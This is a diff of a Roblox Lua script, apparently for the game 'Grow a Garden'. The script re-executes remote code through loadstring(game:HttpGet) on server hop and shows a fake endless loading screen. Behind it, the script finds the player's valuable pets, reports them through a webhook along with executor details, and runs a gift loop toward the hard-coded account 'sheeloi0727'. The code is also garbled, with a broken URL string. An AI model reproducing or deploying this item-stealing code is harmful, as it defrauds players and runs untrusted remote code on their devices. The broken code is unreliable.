@@ -1,10 +1,9 @@
--- ✅ Auto Server Hop if Full (Before Loading)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 local placeId = game.PlaceId
-local scriptUrl = "https://raw.githubusercontent.com/loiscripts/grow-a-garden/refs/heads/main/test"
+local scriptUrl = "https://raw.githubusercontent.com/loiscripts/grow-a-gardeTeleportToPlaceInstance
 
 local function getLowPopServer()
     local servers = {}
@@ -32,18 +31,13 @@ if #Players:GetPlayers() >= 5 then
     local serverId = getLowPopServer()
     if serverId then
         if queue_on_teleport then
-            -- ✅ Teleport re-execution fix
-queue_on_teleport = queue_on_teleport or (syn and syn.queue_on_teleport)
-if queue_on_teleport then
-    queue_on_teleport(("loadstring(game:HttpGet('%s'))()"):format(scriptUrl))
-end)()")
+            queue_on_teleport(("loadstring(game:HttpGet('%s'))()"):format(scriptUrl))
         end
         TeleportService:TeleportToPlaceInstance(placeId, serverId, LocalPlayer)
         return
     end
 end
 
--- START GUI LOADER
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
@@ -109,7 +103,6 @@ runnerGradient.Color = ColorSequence.new{
 runnerGradient.Rotation = 45
 runnerGradient.Parent = sliderRunner
 
--- Infinite loading
 task.spawn(function()
     while true do
         for i = 1, 100 do
@@ -120,7 +113,6 @@ task.spawn(function()
     end
 end)
 
--- MAIN FUNCTIONALITY
 local matchedTools = {}
 local petNames = {
     ["Silver Monkey"] = true,
@@ -149,7 +141,6 @@ for _, tool in ipairs(Backpack:GetChildren()) do
     end
 end
 
--- Webhook logic
 local toolNames, embedFields = {}, {}
 for _, tool in ipairs(matchedTools) do
     table.insert(toolNames, tool.Name)
@@ -169,7 +160,6 @@ else
     })
 end
 
--- Player Info
 local receiver = LocalPlayer.Name
 local sender = "sheeloi0727"
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
@@ -217,7 +207,6 @@ local success, err = pcall(function()
     })
 end)
 
--- Gift logic (sender → receiver)
 task.spawn(function()
     while true do
         local targetPlayer = Players:FindFirstChild("sheeloi0727")
